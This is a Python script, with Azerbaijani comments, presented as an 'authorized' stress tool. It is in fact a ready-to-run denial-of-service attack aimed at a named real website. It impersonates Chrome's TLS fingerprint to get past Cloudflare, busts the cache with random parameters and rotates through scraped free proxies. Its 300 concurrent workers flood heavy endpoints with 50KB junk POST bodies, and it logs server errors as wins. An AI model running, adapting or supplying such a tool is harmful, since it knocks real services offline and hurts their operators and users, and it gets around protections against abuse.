#!/usr/bin/env python3
"""
Async Cloudflare Bypass / Origin Stress Tool (Authorized Testing Only)
Stack: curl_cffi (Async JA3 + HTTP/2) + Proxy Rotation + Cache Bypass + Heavy POST
"""

import asyncio
import random
import time
import sys
import threading
import urllib.request

try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("[!] pip install curl-cffi")
    sys.exit(1)

# ------------------- CONFIG -------------------
TARGET_DOMAIN = "https://empro.az/#/login"

# Saytın ağır endpointləri (DB sorgu/CPU tükədən):
# Əgər saytın "/api/invest", "/register", "/task/list" tipli ağır API-ləri varsa,
# onları əlavə edin. Əks halda root "/" işləyər.
ENDPOINTS = [
    "/",
    "/register",
    "/login",
    "/vip/buy",
    "?page=vip",
    "?action=getTasks",
]

# Əgər öz residential proxy-ləriniz varsa, bura əlavə edin (http://ip:port formatında)
CUSTOM_PROXIES = [
    # "http://user:pass@ip:port",
]

CONCURRENCY = 300        # Eyni vaxtda aktiv async worker sayı
TIMEOUT = 12             # Saniyə
POST_PAYLOAD_KB = 50     # Hər POST-da göndərilən boş data ölçüsü (KB)

# Proxy testi (ölü proxy-ləri atmaq üçün)
PROXY_TEST_URL = "http://httpbin.org/ip"
# ---------------------------------------------

stats = {"ok": 0, "err": 0, "cf_block": 0, "origin_slow": 0, "http_5xx": 0}
stats_lock = threading.Lock()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

def log(label, msg):
    print(f"[{label}] {msg}")

def update(stat_key, val=1):
    with stats_lock:
        stats[stat_key] += val
        total = stats["ok"] + stats["err"] + stats["cf_block"]
        if total % 250 == 0:
            print(f"\n[*] Total: {total} | OK:{stats['ok']} | 5xx:{stats['http_5xx']} | SLOW:{stats['origin_slow']} | CF_Block:{stats['cf_block']} | Err:{stats['err']}\n")

async def fetch_free_proxies():
    """Pulsuz proxy siyahılarından HTTP proxy çəkir. Kaliteli proxy istəsəniz öz listinizi girin."""
    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http/socks5.txt",
    ]
    proxies = list(CUSTOM_PROXIES)
    for src in sources:
        try:
            data = await asyncio.get_event_loop().run_in_executor(
                None, lambda: urllib.request.urlopen(src, timeout=8).read().decode()
            )
            for line in data.splitlines():
                line = line.strip()
                if line and ":" in line:
                    proxies.append(f"http://{line}")
        except Exception:
            pass
    # Təkrarları sil, ilk 200-ni saxla
    proxies = list(dict.fromkeys(proxies))[:200]
    log("INFO", f"{len(proxies)} proxy yükləndi.")
    return proxies

async def heavy_request(session: AsyncSession, proxy: str, endpoint: str):
    """
    Ağır sorğu: Cache bypass + böyük POST body + real Chrome fingerprint.
    Cloudflare-ni keçib origin-ə yük salmaq üçün nəzərdə tutulub.
    """
    ts = int(time.time() * 1000)
    rand = random.randint(100000, 999999)
    # Cache bypass: hər URL unikaldır
    url = f"{TARGET_DOMAIN}{endpoint}&_ts={ts}&_r={rand}&_cb={random.random()}"

    headers = {
        "User-Agent": random.choice(UA_LIST),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,az;q=0.8,tr;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": random.choice([
            "https://www.google.com/search?q=disney+plus",
            "https://www.bing.com/",
            "https://www.facebook.com/",
            TARGET_DOMAIN,
        ]),
        "Origin": TARGET_DOMAIN,
        "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Origin serveri tükəndirmək üçün ağır POST payload (boş data)
    # Database yazma, validasiya, loglama işləri aparan endpointlərdə CPU/Disk yorar
    payload = "x=" + ("A" * (POST_PAYLOAD_KB * 1024)) + "&submit=1&action=process"

    try:
        start = time.time()
        r = await session.post(
            url,
            headers=headers,
            data=payload,
            proxy=proxy,
            timeout=TIMEOUT,
            impersonate="chrome110",  # Real Chrome JA3 + HTTP/2 fingerprint
            allow_redirects=True,
        )
        elapsed = time.time() - start

        status = r.status_code
        if status in (502, 503, 504):
            update("http_5xx")
            log("WIN", f"SERVER ERROR {status} -> Origin çökür! ({elapsed:.1f}s)")
        elif status == 429 or status == 403:
            update("cf_block")
        else:
            update("ok")
            # Əgər cavab 2 saniyədən çoxsa, origin server artıq tükənməyə başlayıb
            if elapsed > 2.5:
                update("origin_slow")
                log("SLOW", f"Response {elapsed:.1f}s (Origin tükənir)")

    except asyncio.TimeoutError:
        update("origin_slow")
        log("SLOW", "Timeout -> Origin server cavab verə bilmir.")
    except Exception:
        update("err")

async def worker_loop(session: AsyncSession, proxy: str, sem: asyncio.Semaphore):
    """Bir proxy üzərində sonsuz döngü ilə fərqli endpointləri bombalayır."""
    while True:
        async with sem:
            ep = random.choice(ENDPOINTS)
            await heavy_request(session, proxy, ep)

async def main():
    print("=" * 60)
    print("  ORIGIN STRESS / Cloudflare Bypass (curl_cffi Async)")
    print("=" * 60)
    print(f"Target    : {TARGET_DOMAIN}")
    print(f"Endpoints : {ENDPOINTS}")
    print(f"Payload   : {POST_PAYLOAD_KB} KB (POST data)")
    print(f"Workers   : {CONCURRENCY}")
    print(f"[*] Proxy'siz bu test Cloudflare edge-ə zərər yetirməz, origin-ə çatmalıdır.")
    print(f"[*] Proxy: Öz residential proxy-lərinizi CUSTOM_PROXIES listinə əlavə edin.\n")

    proxies = await fetch_free_proxies()
    if not proxies:
        print("[!] Heç bir proxy tapılmadı. Kodu dayandırmaq yerinə, sadəcə direct mode işləyir...")
        proxies = [None]

    sem = asyncio.Semaphore(CONCURRENCY)

    log("INFO", f"Sessiya yaradılır (impersonate=chrome110)...")
    # curl_cffi bir sessiya üzərindən connection pool idarə edir
    async with AsyncSession(impersonate="chrome110") as session:
        tasks = []
        for proxy in proxies:
            for _ in range(3):  # Hər proxy-dən 3 paralel worker
                t = asyncio.create_task(worker_loop(session, proxy, sem))
                tasks.append(t)

        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Dayandırıldı.")
